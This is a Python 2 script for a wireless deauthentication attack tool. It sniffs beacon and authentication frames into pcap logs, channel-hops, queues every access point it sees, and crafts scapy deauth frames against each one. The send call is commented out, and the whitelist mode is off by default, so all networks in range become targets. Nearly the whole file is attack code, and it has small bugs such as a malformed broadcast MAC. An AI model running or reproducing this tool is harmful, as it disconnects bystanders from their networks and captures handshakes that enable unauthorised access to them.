#!/usr/bin/env python
import sys,os,thread,time
from scapy.all import *
import random # Can remove after completion
import Queue
import pyric
import pyric.pyw as pyw
import pyric.lib.libnl as nl
import pyric.utils.channels as ch
import itertools

# Global Variables
play_nice = False
attack_queue = Queue.Queue()
ap_list = []
attack_list = []
capture = time.strftime("%Y.%m.%d-%H.%M.%S.pcap")
pktdump = PcapWriter("./logs/" + capture, append=True,sync=True)
iface = "wlan0"
client = "FF:FF:FF:FF:FF"
count = 4

# Probing will continually sniff for new Beacons and EAPOL while recording in pcap file.
def ProbingBeacons(pkt) :
  if pkt.haslayer(Dot11) :
		if pkt.haslayer(Dot11Auth) or pkt.haslayer(Dot11Beacon):
			pktdump.write(pkt)
			ap_channel = str(ord(pkt[Dot11Elt:3].info))
			#print "BSSID: %s , Channel: %s" % (pkt.addr2,ap_channel)
			if pkt.addr2 not in ap_list:
				ap_list.append(pkt.addr2)
				if play_nice == True:
					PlayNice(pkt.addr2,ap_channel)
				else:
					attack_queue.put((pkt.addr2,ap_channel))

# Scapy's Sniffing service - wlan0 should be the primary card for sniffing.
def Sniffing():
	sniff(iface="wlan0", prn=ProbingBeacons, store=0)

# Main attacking function.
def GetAngry(data):
	(bssid,channel) = data
	if bssid not in attack_list:
		print "Attacking BSSID: %s on Channel %s" % (bssid, channel)
		#SetIfaceChannel('wlan0',channel)
		Deauth(bssid)
		# Random sleep time between 1 and 5 to test for wireless card change time
		attack_list.append(bssid)

	elif bssid in attack_list:
		print "Already Attacked BSSID: %s" % bssid
	else:
		print "Something went wrong"

# PlayNice will check to make sure the BSSID is on the whitelist.
def PlayNice(bssid,channel):
	if bssid in whitelist:
		print "Approved SSID... Attack!"
		attack_queue.put((bssid,channel))
	else:
		print "Avoiding FCC Violations."

# TimeSink will add APs to Queue as seen and pop them off as completed. 
def TimeSink():
	while True:
		if attack_queue.empty():
			time.sleep(5)
		elif not attack_queue.empty():
			GetAngry(attack_queue.get())
		else:
			print "Something went wrong"

# Make sure the Interfaces that are being utilized are in Monitor Mode
def SetMonitorMode(iface,action):
	iface = pyw.getcard(iface)
	print pyw.modeget(iface)
	if action == "monitor":
		# check to make sure the card isn't already in monitor mode
		if pyw.modeget(iface) == 'monitor':
			print "Card is already in monitor Mode"
		else:
			print "Putting card into monitor mode"
			pyw.modeset(iface,action)

	elif action == "managed":
		# check to make sure the card isn't already in managed mode
		if pyw.modeget(iface) == 'managed':
			print "Card is already in managed Mode"
		else:
			print "Putting card into managed mode"
			pyw.modeset(iface,action)
	else:
		print "Unrecongnized command"


# Changes the Interface (typically of wlan1) to make sure it's listening for the EAPOL Packets. 
def SetIfaceChannel(iface,channel):
	print "Changing %s to channel %s" % (iface,int(channel))
	pyw.chset(iface,int(channel), None)


# Check Interfaces - Make sure there is at least two Wireless Cards that support Monitor Mode
def CheckInterfaces():
	if len(pyw.winterfaces()) <=2:
		print "Not Angry Enough"
	else:
		print "That's my secret cap'n I'm always angry!"

# HoppinIface - Hop the primary Interface to find more beacons.  Much like airodump-ng channel hop
def HoppinIface():
	channels = []
	iface = 'wlan0'
	# Get information for iface from Pyric
	w0 = pyw.getcard(iface)
	pinfo = pyw.phyinfo(w0)
	# I need to figure out how to get into a list the full availability of channels
	# for d in pinfo['bands']:
	# 	HT,VHT = pinfo['bands'][d]['HT'],pinfo['bands'][d]['VHT']
	# 	#print "Band: %s HT/VHT: %s/%s" % (d,HT,VHT)
	# 	if HT:
	# 		print pinfo['bands'][d]['rates']
	# 	if VHT:
	# 		print pinfo['bands'][d]['rates']
	channels = ["01","02","03","04","05","06","07","08","09","10","11","12","13","14","36","40","44","48","52","56","60","64","100","104","108","112","116","120","124","128","132","136"]
	# loop for the entire channel set
	for channel in itertools.cycle(channels):
		SetIfaceChannel(w0,channel)
		time.sleep(3) # Time to sleep per channel


# Debugging Interfaces
def DebuggingInterface(iface):
	interfaces = pyw.interfaces()
	print interfaces
	print "Is %s an interface? %s" % (iface, pyw.isinterface(iface))
	print "Is %s a wireless device? %s" % (iface,pyw.iswireless(iface))
	w0 = pyw.getcard(iface)
	print "Is %s active?  %s" % (iface, pyw.isup(w0))
	print "Is %s blocked? %s" % (iface, pyw.isblocked(w0))
	iinfo = pyw.ifinfo(w0)
	print iinfo
	pinfo = pyw.phyinfo(w0)
	print pinfo['bands']

# Deauth is the Python implementation of sending deauth packets with Scapy
def Deauth(bssid):
	packet = RadioTap()/Dot11(type=0,subtype=12,addr1=client,addr2=bssid,addr3=bssid)/Dot11Deauth(reason=7)
	for n in range(int(count)):
		#sendp(packet)
		print 'Deauth sent via: ' + iface + ' to BSSID: ' + bssid + ' for Client: ' + client


# Start the application and the threads.
if __name__ == "__main__":
	# Make sure you have at least 2 Wireless Interfaces to Start
	CheckInterfaces()

	f = open('whitelist.txt')
	whitelist = f.readlines()
	SetMonitorMode('wlan0','monitor')


	try:
		print "Sniffing for Beacon Frames..."
		thread.start_new(Sniffing, ())
		thread.start_new(HoppinIface,())
		thread.start_new(TimeSink, ())

		while True:
			time.sleep(5)
			print "Captured APs: %i" % len(ap_list)
			print "Attacked APs: %i" % len(attack_list)
			print "Queue Length: %i" % attack_queue.qsize()
			print "Whitelist Length: %i" % len(whitelist)

	except KeyboardInterrupt:
		sys.exit("\n Exiting...")
